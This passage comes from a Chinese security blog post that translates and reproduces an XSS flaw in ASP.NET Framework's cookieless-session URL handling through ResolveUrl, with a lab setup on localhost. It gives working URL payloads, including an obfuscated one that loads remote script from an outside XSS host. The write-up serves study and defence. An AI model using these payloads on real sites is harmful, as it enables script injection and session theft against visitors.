+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src&#x3D;&quot;&lt;%&#x3D; ResolveUrl(&quot;~&#x2F;file.js&quot;) %&gt;&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;link href&#x3D;&quot;&lt;%&#x3D; ResolveUrl(&quot;~&#x2F;file.css&quot;) %&gt;&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class="line">&lt;img src&#x3D;&quot;&lt;%&#x3D; ResolveUrl(&quot;~&#x2F;file.jpg&quot;) %&gt;&quot; &#x2F;&gt;</span><br><span class="line">&lt;a href&#x3D;&quot;&lt;%&#x3D; ResolveUrl(&quot;~&#x2F;file.aspx&quot;) %&gt;&quot;&gt;click&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>
+<p>幸运的是，<code>ResolveUrl</code>并非唯一的能将<code>~</code>解析为webapp根目录的方法.让我们快速浏览一下其他ASP.NET功能在处理URL中的cookieless session ID时的行为。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- run src attribute on the server side as an HTML Control --&gt;</span><br><span class="line">&lt;img src&#x3D;&quot;~&#x2F;file.jpg&quot; runat&#x3D;&quot;server&quot; &#x2F;&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- run as Web Control --&gt;</span><br><span class="line">&lt;asp:Image ID&#x3D;&quot;Image1&quot; runat&#x3D;&quot;server&quot; ImageUrl&#x3D;&quot;~&#x2F;file.jpg&quot; &#x2F;&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- run as ResolveUrl --&gt;</span><br><span class="line">&lt;img src&#x3D;&quot;&lt;%&#x3D; ResolveUrl(&quot;~&#x2F;file.jpg&quot;) %&gt;&quot; &#x2F;&gt;</span><br></pre></td></tr></table></figure>
+<p>然后访问最简易的payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;A&#x2F;B&#x2F;C&#x2F;(A(%22onerror&#x3D;%22alert&#96;1&#96;%22))&#x2F;default.aspx</span><br></pre></td></tr></table></figure>
+<p>得到以下结果:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- run src attribute on the server side as an HTML Control --&gt;</span><br><span class="line">&lt;img src&#x3D;&quot;..&#x2F;..&#x2F;..&#x2F;file.jpg&quot; &#x2F;&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- run as Web Control --&gt;</span><br><span class="line">&lt;img id&#x3D;&quot;Image1&quot; src&#x3D;&quot;..&#x2F;..&#x2F;..&#x2F;file.jpg&quot; &#x2F;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!-- run as ResolveUrl --&gt;</span><br><span class="line">&lt;img src&#x3D;&quot;&#x2F;(A(&quot;onerror&#x3D;&quot;alert&#96;1&#96;&quot;))&#x2F;file.jpg&quot; &#x2F;&gt;</span><br></pre></td></tr></table></figure>
+<p>web control 和HTML control在解析<code>~</code>时，省略了URL的cookieless部分.不幸的是，我们无法在这些地方进行XSS攻击。</p>
+<h3 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h3><p>我们学习了关于远古ASP.NET的功能(cookieless session)的一些知识，为了向后兼容，该功能在现代Web应用程序中仍然存在.此外，我们发现了利用XSS漏的方法，了解了一些JS小技巧，用来在绕过部分字符被过滤的情况</p>
+<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>翻译完了，应该并不难懂。</p>
+<p>但是为了帮助理解，也帮助像我这样从来没接触过.NET开发的菜鸡复现.我再手把手复现展示一下。</p>
+<h3 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h3><p>系统，windows 10 最新版本</p>
+<p>官网<a target="_blank" rel="noopener" href="https://visualstudio.microsoft.com/zh-hans/vs/">下载</a>vs2019 community，安装的时候记得勾选C#和.NET相关的组件。</p>
+<p>安装完新建项目，记得选<code>ASP.NET web应用程序(.NET Framework)</code>，不要选<code>ASP.NET Core WEB应用程序</code>，ASP.NET Core已经弃用了aspx，似乎也弃用了ResolveUrl方法。</p>
+<p><img src="image-20200323020903891.png" alt="image-20200323020903891"></p>
+<p> 下一步，然后可以选择.NET Framework的版本.原文演示的是4.0，但是实际上最新的4.8上同样可用.我们来整个最新的。</p>
+<p><img src="image-20200323021054821.png" alt="image-20200323021054821"></p>
+<p>再下一步，选空项目就可以。</p>
+<p>创建完了，添加一个Web窗体。</p>
+<p><img src="image-20200323021546570.png" alt="image-20200323021546570"></p>
+<p>把文章开始的代码复制进去</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ Page Language&#x3D;&quot;C#&quot; %&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;&lt;&#x2F;title&gt;</span><br><span class="line">    &lt;script src&#x3D;&quot;&lt;%&#x3D; ResolveUrl(&quot;~&#x2F;Script.js&quot;) %&gt;&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    .NET version: &lt;%&#x3D;Environment.Version%&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
+<p>然后运行.尝试访问，端口是随机的。</p>
+<p>先来看看是不是像他说得这样，访问<code>https://localhost:44345/(A(ABCD))/xss.aspx</code></p>
+<p><img src="image-20200323022126909.png" alt="image-20200323022126909"></p>
+<p>确实可以，然后是最简单的弹窗.访问<code>https://localhost:44345/(A(%22onerror=%22alert%601%60%22))/xss.aspx</code></p>
+<p><img src="image-20200323022227594.png" alt="image-20200323022227594"></p>
+<p>最后是完成的payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;localhost:44345&#x2F;(A(%22onerror&#x3D;%22js&#x3D;document.createElement%60script%60;js.src&#x3D;%60$%7BString.fromCharCode%6047%60%7D$%7BString.fromCharCode%6047%60%7Dxsshs.cn$%7BString.fromCharCode%6047%60%7DQbLA%60;headEl&#x3D;document.getElementsByTagName%60head%60[0];new%20Function%60X$%7Bdocument.location.hash.substr%601%60%7DX%60%22))&#x2F;xss.aspx#headEl.appendChild(js)</span><br></pre></td></tr></table></figure>
+<p><img src="image-20200323024002741.png" alt="image-20200323024002741"></p>
+<p>OK，大功告成。</p>
+<p>备注:之前看到linux下也可以通过mono运行aspx程序，测试了下，并没有这个漏洞。</p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>M09ic
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://m09ic.top/posts/35797/" title="通杀.NET的XSS!(原文翻译以及复现)">https://m09ic.top/posts/35797/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" rel="tag"># 漏洞分析</a>
+              <a href="/tags/XSS/" rel="tag"># XSS</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/posts/22311/" rel="prev" title="小技巧---给工具用上代理池">
+      <i class="fa fa-chevron-left"></i> 小技巧---给工具用上代理池
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/posts/36360/" rel="next" title="实用的命令行技巧与花里胡哨的命令行界面">
+      实用的命令行技巧与花里胡哨的命令行界面 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%AD%A3%E6%96%87"><span class="nav-number">1.</span> <span class="nav-text">正文</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#How-does-it-work"><span class="nav-number">1.1.</span> <span class="nav-text">How does it work?</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9B%9E%E5%88%B0%E4%BB%A5%E5%89%8D"><span class="nav-number">1.2.</span> <span class="nav-text">回到以前</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XSS"><span class="nav-number">1.3.</span> <span class="nav-text">XSS!</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B6%E4%BB%96%E6%96%B9%E5%BC%8F"><span class="nav-number">1.4.</span> <span class="nav-text">其他方式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%91%98%E8%A6%81"><span class="nav-number">1.5.</span> <span class="nav-text">摘要</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A4%8D%E7%8E%B0"><span class="nav-number">2.</span> <span class="nav-text">复现</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%90%AD%E5%BB%BA%E7%8E%AF%E5%A2%83"><span class="nav-number">2.1.</span> <span class="nav-text">搭建环境</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">M09ic</p>
+  <div class="site-description" itemprop="description">网络安全,编程学习记录的破地方</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">28</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">15</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/M09Ic" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;M09Ic" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:m09ic@foxmail.com" title="E-Mail → mailto:m09ic@foxmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title">
+      <i class="fa fa-fw fa-link"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://yml-sec.top/" title="https:&#x2F;&#x2F;yml-sec.top" rel="noopener" target="_blank">夜莫离</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://nightrainy.github.io/" title="https:&#x2F;&#x2F;nightrainy.github.io" rel="noopener" target="_blank">知世</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://www.360bug.net/" title="http:&#x2F;&#x2F;www.360bug.net" rel="noopener" target="_blank">孙德胜</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-paper-plane"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">M09ic</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : 'yP9ifyVVnh7znqRQVWNWn0V6-gzGzoHsz',
+      appKey     : 'k84kdIIIEt3b7F17XqEoBT22',
+      placeholder: "Just go go",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : false,
+      lang       : '' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
